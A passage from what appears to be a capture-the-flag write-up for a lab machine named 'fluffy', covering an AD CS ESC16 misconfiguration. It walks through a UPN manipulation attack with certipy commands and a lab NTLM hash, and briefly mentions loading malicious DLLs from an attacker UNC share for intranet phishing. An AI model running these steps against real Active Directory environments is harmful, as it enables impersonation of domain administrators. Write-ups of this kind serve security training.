But we can see this line:

```xml

```

This means it instructs the .NET runtime to allow loading assemblies (DLLs) from remote locations, including:

* UNC paths (\\attacker\\share\\malicious.dll)
* Mapped Drives
* Even web-based locations (on older versions or misconfigurations)

Normally, this would be blocked by .NET security policy — unless explicitly allowed like here.

So at this point we can do:

1. Phishing on the intranet via SMB path (\\).
2. Spoofing lures.
3. Sending phishing payloads via intranet share references.

## ESC16

### Overview

Look at the first/top line.

```
"ESC16": "Security Extension is disabled"
```

> ESC16 is also mentioned in the [Certipy Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally).

Now we can perform a "UPN Manipulation Attack".

### UPN Manipulation

We use the `ca_svc` account:

```sh
certipy account \
      -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
      -dc-ip $ip -user 'ca_svc' \
      read
```

Output we get:


Our goal is to overwrite `userPrincipalName` from (`ca_svc@fluffy.htb`) to `administrator@fluffy.htb`.

This allows us to impersonate the administrator account during certificate enrollment.

```sh
certipy account \
      -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
      -dc-ip $ip -upn 'administrator' \
      -user 'ca_svc' \
      update
```

Run again to make sure.

```sh
certipy req -dc-ip $ip \
      -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
      -target 'DC01.fluffy.htb' \
      -ca 'fluffy-DC01-CA' \
      -template 'User'
```

Now we get the administrator UPN that has been created by the CA.

Now revert our fake UPN so it doesn’t conflict with the original.

```
certipy account \
    -u ''ca_svc@fluffy.htb'' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' \
    -dc-ip $ip -upn 'ca_svc' \
    -user 'ca_svc' \
    update
```
